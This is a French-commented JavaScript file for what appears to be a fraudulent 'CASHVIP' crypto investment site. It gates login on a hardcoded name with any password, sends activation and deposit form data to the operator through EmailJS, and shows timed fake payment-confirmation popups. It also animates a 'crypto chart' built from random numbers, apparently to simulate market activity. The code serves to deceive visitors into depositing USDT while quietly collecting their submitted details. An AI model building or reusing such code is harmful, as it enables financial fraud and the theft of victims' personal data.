// Configuration EmailJS
(function() {
    emailjs.init("e8-SeGZQ8QzYC6BNk");
})();

// Navigation entre les pages
function redirectTo(page) {
    window.location.href = page;
}

// Fonction de validation de connexion
function validateLogin() {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    
    // Vérification de l'ID (test avec "SOUMAH LAMINE")
    if (username.toUpperCase() === 'SOUMAH LAMINE' && password) {
        // Stocker l'ID dans le localStorage
        localStorage.setItem('userName', username);
        localStorage.setItem('userId', '123456');
        
        // Redirection vers le tableau de bord
        redirectTo('dashboard.html');
    } else {
        // Afficher le popup d'erreur
        document.getElementById('errorPopup').classList.remove('hidden');
    }
}

// Page d'avertissement
function acceptWarning() {
    redirectTo('login.html');
}

function refuseWarning() {
    alert('Vous avez refusé les conditions. Cette page va se fermer.');
    window.close();
}

// Fermer le popup d'erreur de connexion
function closeErrorPopup() {
    document.getElementById('errorPopup').classList.add('hidden');
}

// Tableau de bord - Navigation
function showHistory() {
    document.getElementById('historySection').classList.remove('hidden');
}

function hideHistory() {
    document.getElementById('historySection').classList.add('hidden');
}

function goToCashvip() {
    redirectTo('cashvip.html');
}

function showActivationForm() {
    redirectTo('activation-form.html');
}

// Page CASHVIP
function showTerms() {
    document.getElementById('termsPopup').classList.remove('hidden');
}

function closeTerms() {
    document.getElementById('termsPopup').classList.add('hidden');
}

function selectLevel(levelName, amount) {
    // Rediriger vers la page de dépôt avec les paramètres
    redirectTo(`deposit-form.html?level=${encodeURIComponent(levelName)}&amount=${amount}`);
}

// Formulaire d'activation - Accepter l'intégration du serveur
function acceptServerIntegration() {
    redirectTo('cashvip.html');
}

// Formulaire de dépôt - Mise à jour de la conversion
function updateConversion(usdtAmount) {
    const rate = 8684.41; // 1 USDT = 8684.41 GNF
    const gnfAmount = (usdtAmount * rate).toFixed(2);
    if (document.getElementById('conversion')) {
        document.getElementById('conversion').textContent = `${usdtAmount} USDT = ${gnfAmount} GNF`;
    }
}

// Flux C - Popups de confirmation de paiement
function triggerPaymentFlow() {
    // Afficher le premier popup
    const popup1 = document.getElementById('paymentPopup1');
    popup1.classList.remove('hidden');
    
    // Fermer automatiquement après 10 secondes (pour test)
    setTimeout(function() {
        popup1.classList.add('hidden');
        
        // Afficher le deuxième popup
        const popup2 = document.getElementById('paymentPopup2');
        popup2.classList.remove('hidden');
        
        // Fermer automatiquement après 5 secondes
        setTimeout(function() {
            popup2.classList.add('hidden');
        }, 5000);
    }, 10000); // 10 secondes pour les tests
}

// Au chargement de la page
document.addEventListener('DOMContentLoaded', function() {
    // Afficher le nom d'utilisateur sur le tableau de bord
    const userNameElement = document.getElementById('userName');
    if (userNameElement) {
        const storedName = localStorage.getItem('userName');
        if (storedName) {
            userNameElement.textContent = storedName;
        }
    }
    
    const userIdElement = document.getElementById('userId');
    if (userIdElement) {
        const storedId = localStorage.getItem('userId');
        if (storedId) {
            userIdElement.textContent = `ID: ${storedId}`;
        }
    }
    
    // Gestion du formulaire d'activation
    const activationForm = document.getElementById('activationForm');
    if (activationForm) {
        activationForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Envoyer les données via EmailJS
            emailjs.sendForm('service_gln1lvf', 'template_cv4a0y7', this)
                .then(function() {
                    console.log('Email envoyé avec succès!');
                }, function(error) {
                    console.log('Erreur lors de l\'envoi:', error);
                });
            
            // Afficher le popup d'information
            document.getElementById('postActivationPopup').classList.remove('hidden');
        });
    }
    
    // Gestion du formulaire de dépôt
    const depositForm = document.getElementById('depositForm');
    if (depositForm) {
        // Récupérer les paramètres d'URL pour pré-remplir le niveau et le montant
        const urlParams = new URLSearchParams(window.location.search);
        const level = urlParams.get('level');
        const amount = urlParams.get('amount');
        
        if (level && amount) {
            document.getElementById('selectedLevel').value = level;
            document.getElementById('amount').value = `${amount} USDT`;
            
            // Calculer et afficher la conversion
            updateConversion(amount);
        }
        
        depositForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Envoyer les données via EmailJS
            emailjs.sendForm('service_gln1lvf', 'template_iruzzlf', this)
                .then(function() {
                    console.log('Email de dépôt envoyé avec succès!');
                }, function(error) {
                    console.log('Erreur lors de l\'envoi:', error);
                });
            
            // Déclencher le Flux C (popups de confirmation)
            triggerPaymentFlow();
        });
    }
    
    // Simulation de graphique crypto (effet visuel)
    const chart = document.getElementById('cryptoChart');
    if (chart) {
        // Créer un effet de graphique animé avec des barres
        for (let i = 0; i < 20; i++) {
            const bar = document.createElement('div');
            bar.style.position = 'absolute';
            bar.style.bottom = '0';
            bar.style.left = `${i * 5}%`;
            bar.style.width = '4%';
            bar.style.height = `${Math.random() * 80 + 20}%`;
            bar.style.background = `linear-gradient(to top, rgba(52, 152, 219, 0.7), rgba(155, 89, 182, 0.7))`;
            bar.style.borderRadius = '2px 2px 0 0';
            bar.style.transition = 'height 1s ease';
            chart.appendChild(bar);
        }
        
        // Animer les barres
        setInterval(function() {
            const bars = chart.querySelectorAll('div');
            bars.forEach(bar => {
                bar.style.height = `${Math.random() * 80 + 20}%`;
            });
        }, 2000);
    }
});
